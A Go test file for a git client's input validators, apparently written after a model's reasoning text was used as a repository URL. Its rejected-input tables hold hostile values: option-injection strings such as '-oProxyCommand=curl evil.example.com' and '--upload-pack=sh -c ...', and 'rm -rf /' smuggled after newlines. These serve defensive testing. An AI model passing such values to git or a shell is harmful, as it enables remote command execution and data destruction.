package git

import (
	"context"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"
)

// qwenChainOfThoughtRepo is the shape of value that reached `git push` in #35703: the
// llm-server asked a model for a repository URL, the model answered with numbered
// reasoning, and the whole blob was prefixed with a scheme and used as the repo.
const qwenChainOfThoughtRepo = `https://github.com/1. Analyze the input text: "Tune NBLLMEgressFilterFlagging alert"
2. Look for GitHub/GitLab URLs: None found.
6. Final output: Empty string.`

func TestValidateRepoURL(t *testing.T) {
	valid := []string{
		"https://github.com/owner/repo",
		"https://github.com/owner/repo.git",
		"http://github.com/owner/repo",
		"https://gitlab.com/group/project",
		"https://gitlab.company.com/group/subgroup/project",
		"https://github.com:8443/owner/repo",
		"ssh://git@github.com/owner/repo",
		"git@github.com:owner/repo.git",
		"https://x-access-token:tok@github.com/owner/repo",
	}
	for _, repoURL := range valid {
		require.NoError(t, ValidateRepoURL(repoURL), "expected valid: %q", repoURL)
	}

	invalid := map[string]string{
		"empty":                 "",
		"prose":                 "no repository is mentioned here",
		"chain of thought":      qwenChainOfThoughtRepo,
		"embedded newline":      "https://github.com/owner/repo\nrm -rf /",
		"embedded space":        "https://github.com/owner/repo extra",
		"leading whitespace":    "  https://github.com/owner/repo",
		"trailing whitespace":   "https://github.com/owner/repo ",
		"tab":                   "https://github.com/owner\t/repo",
		"no host":               "/owner/repo",
		"host only":             "https://github.com",
		"single path segment":   "https://github.com/owner",
		"looks like a git flag": "-oProxyCommand=curl evil.example.com",
		"bare owner/repo":       "owner/repo",
		"scp form with no path": "git@github.com",
		"control character":     "https://github.com/owner/repo\x00",
	}
	for name, repoURL := range invalid {
		t.Run(name, func(t *testing.T) {
			require.Error(t, ValidateRepoURL(repoURL), "expected invalid: %q", repoURL)
		})
	}
}

func TestValidateBranchName(t *testing.T) {
	valid := []string{"main", "test", "fix/llm-egress-filter", "release/1.x", "feature_x", "v2.0.1"}
	for _, branch := range valid {
		require.NoError(t, ValidateBranchName(branch), "expected valid: %q", branch)
	}

	invalid := map[string]string{
		"empty":               "",
		"leading dash":        "-main",
		"upload-pack payload": "--upload-pack=sh -c 'curl evil.example.com'",
		"embedded space":      "my branch",
		"leading whitespace":  " main",
		"trailing whitespace": "main ",
		"newline":             "main\nrm -rf /",
		"control character":   "main\x00",
	}
	for name, branch := range invalid {
		t.Run(name, func(t *testing.T) {
			require.Error(t, ValidateBranchName(branch), "expected invalid: %q", branch)
		})
	}
}

// An empty branch means "clone the default branch" and must stay supported — the
// validator rejects it, so callers have to skip the check rather than fail.
func TestCloneOrReuseRepositoryAllowsEmptyBranch(t *testing.T) {
	origin := buildOriginRepo(t)
	gc := NewGitClient(t.TempDir(), 60*time.Second, 0)
	worktree := filepath.Join(t.TempDir(), "wt")

	_, err := gc.CloneOrReuseRepository(context.Background(), origin, nil, "", worktree)
	require.NoError(t, err)
}

func TestCloneOrReuseRepositoryRejectsOptionLikeBranch(t *testing.T) {
	origin := buildOriginRepo(t)
	gc := NewGitClient(t.TempDir(), 60*time.Second, 0)
	worktree := filepath.Join(t.TempDir(), "wt")

	_, err := gc.CloneOrReuseRepository(context.Background(), origin, nil, "--upload-pack=evil", worktree)
	require.Error(t, err)

	_, err = gc.CloneOrReuseRepository(context.Background(), origin, nil, "test", worktree, "--upload-pack=evil")
	require.Error(t, err)
}

func TestSplitRepoURL(t *testing.T) {
	cases := []struct {
		raw      string
		wantHost string
		wantPath string
	}{
		{"https://github.com/owner/repo", "github.com", "/owner/repo"},
		{"https://github.com:8443/owner/repo", "github.com", "/owner/repo"},
		{"ssh://git@github.com/owner/repo", "github.com", "/owner/repo"},
		{"git@github.com:owner/repo.git", "github.com", "owner/repo.git"},
		{"https://x-access-token:tok@github.com/owner/repo", "github.com", "/owner/repo"},
		{"owner/repo", "", ""},
		{"", "", ""},
	}
	for _, tc := range cases {
		host, path := SplitRepoURL(tc.raw)
		require.Equal(t, tc.wantHost, host, "host for %q", tc.raw)
		require.Equal(t, tc.wantPath, path, "path for %q", tc.raw)
	}
}

// git echoes the push target in its own output, so the token has to be scrubbed out of
// command output before it reaches a log, an error, or the model's context.
func TestRedactURLCredentials(t *testing.T) {
	const token = "ghs_2018861secrettoken"
	out := "remote: Permission denied\n" +
		"fatal: unable to access 'https://x-access-token:" + token + "@github.com/owner/repo.git/': 403\n"

	got := RedactURLCredentials(out)
	require.NotContains(t, got, token)
	require.Contains(t, got, "https://github.com/owner/repo.git/")
	require.Contains(t, got, "remote: Permission denied")
}

func TestRedactURLCredentialsLeavesCleanTextAlone(t *testing.T) {
	const clean = "Everything up-to-date, pushed to https://github.com/owner/repo"
	require.Equal(t, clean, RedactURLCredentials(clean))
}

// StripURLUserinfo must not echo a scheme-bearing value it cannot parse — that value
// may embed a token, which is the whole reason the helper exists.
func TestStripURLUserinfoFailsClosed(t *testing.T) {
	unparseable := "https://x-access-token:tok@github.com/owner/repo\n2. next line"
	got := StripURLUserinfo(unparseable)
	require.NotContains(t, got, "tok")
	require.Equal(t, "<unparseable-url>", got)

	// Values with no HTTP(S) scheme cannot carry userinfo of this shape.
	require.Equal(t, "origin", StripURLUserinfo("origin"))
	require.True(t, strings.HasPrefix(StripURLUserinfo("git@github.com:o/r.git"), "git@"))
}
